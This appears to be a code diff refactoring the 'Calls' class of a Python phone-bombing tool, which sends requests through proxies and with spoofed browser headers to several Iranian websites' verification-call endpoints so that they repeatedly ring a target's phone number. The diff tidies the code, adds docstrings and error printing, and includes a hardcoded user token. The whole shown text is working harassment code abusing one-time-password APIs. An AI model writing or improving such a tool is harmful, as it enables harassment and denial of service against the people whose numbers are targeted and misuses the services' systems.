@@ -736,24 +736,75 @@ class Sms:
         except: pass
 
 
+import os
+
 class Calls:
-    def __init__(self, phone, proxy) -> None:
-        self.phone, self.proxy = phone, proxy
+    def __init__(self, phone_number, request_proxy):
+        """Initialize Calls instance with phone number and proxy."""
+        self.phone_number = phone_number
+        self.request_proxy = request_proxy
     
     def call1(self):
-        try: 
-            get(url=f'https://auth.mrbilit.com/api/Token/send/byCall?mobile=0{self.phone}',
-                    proxies=self.proxy)
-            persian = get(f"https://api.codebazan.ir/adad/?text={self.phone}").json()
+        """Make phone call using specific URLs."""
+        try:
+            get(url=f'https://auth.mrbilit.com/api/Token/send/byCall?mobile=0{self.phone_number}',
+                proxies=self.request_proxy)
+            persian = get(f"https://api.codebazan.ir/adad/?text={self.phone_number}").json()
             get('https://www.tezolmarket.com/Account/Login',
-                    f'PhoneNumber=۰{persian["result"]["fa"]}&SendCodeProcedure=1')
-            get(url=f'https://core.gap.im/v1/user/resendCode.json?mobile=%2B98{self.phone}&type=IVR')
-        except: pass
-    def call2(self):
-        post(url="https://novinbook.com/index.php?route=account/phone",data=f"phone=0{self.phone}&call=yes",headers={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '26','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'language=fa; currency=RLS','origin': 'https://novinbook.com','referer': 'https://novinbook.com/index.php?route=account/phone','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': agent(os="win"),'x-requested-with': 'XMLHttpRequest'})
+                f'PhoneNumber=۰{persian["result"]["fa"]}&SendCodeProcedure=1')
+            get(url=f'https://core.gap.im/v1/user/resendCode.json?mobile=%2B98{self.phone_number}&type=IVR')
+        except Exception as e:
+            print(f"Error in call1: {e}")
 
-    def call3(self):   
-        get(url=f"https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=0{self.phone}", headers={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','device': 'web','deviceid': '6','referer': 'https://www.azki.com/','sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': agent(os="win"),'user-name': 'null','user-token': '2ub07qJQnuG7w1NtXMifm1JeKnKSJzBKnIosaF0FnM8mVfwWAAV4Ae9cMu3JxskL'})
+    def call2(self):
+        """Make another phone call."""
+        try:
+            post(url="https://novinbook.com/index.php?route=account/phone",
+                 data=f"phone=0{self.phone_number}&call=yes",
+                 headers={
+                     'accept': '*/*',
+                     'accept-encoding': 'gzip, deflate, br',
+                     'accept-language': 'en-US,en;q=0.9',
+                     'content-length': '26',
+                     'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                     'cookie': 'language=fa; currency=RLS',
+                     'origin': 'https://novinbook.com',
+                     'referer': 'https://novinbook.com/index.php?route=account/phone',
+                     'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
+                     'sec-ch-ua-mobile': '?0',
+                     'sec-ch-ua-platform': 'Windows',
+                     'sec-fetch-dest': 'empty',
+                     'sec-fetch-mode': 'cors',
+                     'sec-fetch-site': 'same-origin',
+                     'user-agent': agent(os="win"),
+                     'x-requested-with': 'XMLHttpRequest'
+                 })
+        except Exception as e:
+            print(f"Error in call2: {e}")
+
+    def call3(self):
+        """Make yet another phone call."""
+        try:
+            get(url=f"https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=0{self.phone_number}",
+                headers={
+                    'accept': '*/*',
+                    'accept-encoding': 'gzip, deflate, br',
+                    'accept-language': 'en-US,en;q=0.9',
+                    'device': 'web',
+                    'deviceid': '6',
+                    'referer': 'https://www.azki.com/',
+                    'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': 'Windows',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'same-origin',
+                    'user-agent': agent(os="win"),
+                    'user-name': 'null',
+                    'user-token': '2ub07qJQnuG7w1NtXMifm1JeKnKSJzBKnIosaF0FnM8mVfwWAAV4Ae9cMu3JxskL'
+                })
+        except Exception as e:
+            print(f"Error in call3: {e}")
 
 
 def main(phonenum: str, proxy):
